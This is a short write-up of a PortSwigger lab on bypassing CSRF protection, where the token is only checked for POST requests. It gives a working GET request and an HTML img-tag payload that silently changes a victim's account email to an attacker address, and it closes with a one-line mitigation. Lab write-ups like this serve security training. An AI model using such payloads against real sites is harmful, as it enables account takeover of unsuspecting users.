# Lab 02 — CSRF token validation depends on request method

> **Practitioner** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

**Entry point:** `POST /my-account/change-email` — the CSRF token is only
checked for POST.

## Solution

1. Confirm in Repeater: tampering with the `csrf` parameter → rejected.
2. The flaw: **delete the `csrf` parameter entirely and send the request as
   GET**:

```
GET /my-account/change-email?email=attacker@evil-you.net HTTP/1.1
```

→ accepted (token validation is skipped for GET).

3. Host the same attack as a GET-triggering exploit:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@evil-you.net">
```

4. Deliver to victim — lab solved.

## Mitigation

Validate CSRF tokens on **every** state-changing method; never accept GET for
mutations.
